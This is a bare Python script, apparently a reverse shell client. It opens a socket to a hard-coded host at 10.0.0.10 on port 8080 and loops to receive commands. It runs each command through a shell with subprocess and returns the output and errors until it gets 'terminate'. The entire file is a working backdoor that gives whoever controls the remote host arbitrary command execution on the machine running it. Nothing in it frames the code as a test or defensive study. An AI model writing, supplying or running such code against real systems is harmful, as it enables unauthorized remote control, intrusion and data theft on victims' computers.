import socket
import sys
import os
import subprocess

try:
        global host
        global port
        global s
        host='10.0.0.10'
        port=8080
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(((host),(port)))
except socket.error as e:
        print('Error message:'+e)

while True:
 icmd=s.recv(1024)       
 if "terminate" in icmd:
       s.close()
       break
 else:
       cmd=subprocess.Popen(icmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
       s.send(cmd.stdout.read())#Send result
       s.send(cmd.stderr.read())#In case you made an error in typing the cmd

       
        
